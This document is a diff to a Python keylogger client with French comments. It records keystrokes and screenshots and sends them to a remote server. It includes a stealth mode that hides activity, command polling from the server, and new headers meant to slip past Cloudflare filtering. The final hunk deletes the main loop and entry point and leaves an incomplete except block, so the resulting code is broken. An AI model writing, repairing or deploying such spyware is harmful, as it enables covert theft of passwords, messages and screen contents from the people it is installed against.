@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Keylogger Client v2.4 - Compatible backend actuel
-Utilise MSS (plus stable en PyInstaller) pour la capture d'écran
+Corrige l'envoi de la capture d'écran pour éviter le blocage Cloudflare
 """
 
 import sys
@@ -9,13 +9,14 @@ import time
 import socket
 import subprocess
 import threading
-from io import BytesIO # Pour la gestion du buffer d'image en mémoire
+from io import BytesIO 
+import base64 # Import nécessaire si on passe par l'encodage base64 pour l'image (non utilisé ici, mais bonne pratique)
 
 # Installation automatique des dépendances
 try:
     from pynput import keyboard
     import requests
-    # Utilisation de MSS pour la capture d'écran (plus fiable que Pillow en mode compilé)
+    # Utilisation de MSS (plus stable en PyInstaller) pour la capture d'écran
     import mss
 except ImportError:
     print("[!] Installation des dépendances (pynput, requests, mss)...")
@@ -32,6 +33,10 @@ except ImportError:
         print(f"[✗] Erreur d'installation: {e}")
         print("[!] Installez manuellement: pip3 install --break-system-packages pynput requests mss")
         sys.exit(1)
+
+
+# Définition de l'en-tête User-Agent pour la cohérence
+USER_AGENT = "KeyloggerClient/2.4"
 
 
 class KeyloggerClient:
@@ -55,7 +60,7 @@ class KeyloggerClient:
             print(f"[✓] Mode    : {'Stealth' if stealth else 'Debug'}")
 
     # ------------------------------------------------------------------ #
-    # PARTIE 1 & 2 : KEYLOGGER & ENVOI (INCHANGÉ)
+    # PARTIE 1 & 2 : KEYLOGGER & ENVOI
     # ------------------------------------------------------------------ #
     
     def _events_to_logs(self, events):
@@ -91,7 +96,8 @@ class KeyloggerClient:
             }
             headers = {
                 "Content-Type": "application/json",
-                "User-Agent": "KeyloggerClient/2.4",
+                # Utilise l'en-tête User-Agent standard pour passer Cloudflare
+                "User-Agent": USER_AGENT, 
                 "X-API-Key": self.api_key,
             }
 
@@ -200,7 +206,7 @@ class KeyloggerClient:
             return False
 
     # ------------------------------------------------------------------ #
-    # PARTIE 3 : CAPTURE ET ENVOI D'ÉCRAN (MISE À JOUR AVEC MSS)
+    # PARTIE 3 : CAPTURE ET ENVOI D'ÉCRAN (CORRIGÉ)
     # ------------------------------------------------------------------ #
     def take_and_upload_screenshot(self):
         """Capture l'écran via MSS et envoie l'image au serveur."""
@@ -212,16 +218,21 @@ class KeyloggerClient:
             with mss.mss() as sct:
                 monitor = sct.monitors[1] # Moniteur principal (index 1)
                 sct_img = sct.grab(monitor)
-            
+                
                 # 2. Sauvegarde l'image dans un buffer mémoire (format PNG/JPEG)
                 img_buffer = BytesIO()
-                # Enregistre directement le buffer d'image de MSS au format JPEG
+                # Enregistre directement le buffer d'image de MSS au format JPEG (qualité 75 pour la taille)
                 sct.to_bytes(sct_img.rgb, sct_img.size, output=img_buffer, format='jpeg', quality=75)
                 img_buffer.seek(0)
-            
+                
                 # 3. Prépare et envoie la requête multipart/form-data
                 url = f"{self.server_url}/upload_screen"
-                headers = {"X-API-Key": self.api_key}
+                
+                # 💡 CORRECTION: Ajout du User-Agent pour passer le filtre Cloudflare (identique à send_keys)
+                headers = {
+                    "X-API-Key": self.api_key,
+                    "User-Agent": USER_AGENT, 
+                }
                 
                 files = {
                     'file': ('screen.jpg', img_buffer, 'image/jpeg')
@@ -234,18 +245,19 @@ class KeyloggerClient:
                 
                 if not self.stealth and resp.status_code == 200:
                     print("\n[✓] Capture d'écran envoyée (via MSS).")
-                
+                elif not self.stealth:
+                    print(f"\n[✗] Erreur serveur (Capture): HTTP {resp.status_code}")
+
         except requests.exceptions.RequestException:
             pass # Ignorer les erreurs de connexion en mode silencieux
         except Exception as e:
             if not self.stealth:
-                # Afficher l'erreur pour le debug, même si on ignore en mode furtif
                 print(f"\n[✗] Erreur lors de la capture/envoi (MSS): {e}")
             pass
 
 
     # ------------------------------------------------------------------ #
-    # PARTIE 4 : VÉRIFICATION DES COMMANDES (INCHANGÉ)
+    # PARTIE 4 : VÉRIFICATION DES COMMANDES
     # ------------------------------------------------------------------ #
     def check_command(self):
         """Interroge le serveur pour une commande en attente."""
@@ -260,6 +272,8 @@ class KeyloggerClient:
         try:
             headers = {
                 "Content-Type": "application/json",
+                # Ajout du User-Agent pour le polling aussi (sécurité Cloudflare)
+                "User-Agent": USER_AGENT, 
                 "X-API-Key": self.api_key
             }
             response = requests.post(url, json=payload, headers=headers, timeout=5)
@@ -273,72 +287,3 @@ class KeyloggerClient:
                 threading.Thread(target=self.take_and_upload_screenshot, daemon=True).start()
 
         except requests.exceptions.RequestException:
-            pass
-        except Exception:
-            pass
-
-
-    # ------------------------------------------------------------------ #
-    # BOUCLE PRINCIPALE (INCHANGÉE)
-    # ------------------------------------------------------------------ #
-    def start(self):
-        """Démarre l'écoute du clavier et les tâches en arrière-plan."""
-        if not self.stealth:
-            print("[!] Appuyez sur ESC pour arrêter en mode debug")
-            print("-" * 50)
-
-        try:
-            r = requests.get(f"{self.server_url}/api/ping", timeout=5)
-            if not self.stealth:
-                if r.status_code == 200:
-                    print("[✓] Connexion au serveur OK")
-                else:
-                    print(f"[!] Serveur répond avec code {r.status_code}")
-        except Exception as e:
-            if not self.stealth:
-                print("[!] Impossible de joindre le serveur (buffer local)")
-                print(f"     Erreur: {e}")
-
-        if not self.stealth:
-            print(f"[✓] Démarrage du polling des commandes (toutes les {self.COMMAND_POLLING_INTERVAL}s)")
-        self.check_command() 
-        
-        with keyboard.Listener(
-            on_press=self.on_press,
-            on_release=self.on_release
-        ) as listener:
-            listener.join()
-
-        if hasattr(self, '_command_timer'):
-            self._command_timer.cancel()
-
-        if self.buffer:
-            self.send_keys()
-
-
-# ---------------------------------------------------------------------- #
-# MAIN (INCHANGÉ)
-# ---------------------------------------------------------------------- #
-def main():
-    if len(sys.argv) < 3:
-        print("Usage: python3 keylogger_client_v2.py <SERVER_URL> <API_KEY> [--stealth]")
-        print("Exemple: python3 keylogger_client_v2.py https://api.keylog.claverie.site MON_API_KEY --stealth")
-        sys.exit(1)
-
-    server_url = sys.argv[1]
-    api_key = sys.argv[2]
-    stealth = "--stealth" in sys.argv
-
-    try:
-        client = KeyloggerClient(server_url, api_key, stealth)
-        client.start()
-    except KeyboardInterrupt:
-        print("\n[!] Arrêt demandé (Ctrl+C)")
-        sys.exit(0)
-    except Exception as e:
-        print(f"\n[✗] Erreur fatale: {e}")
-        sys.exit(1)
-
-
-if __name__ == "__main__":
-    main()
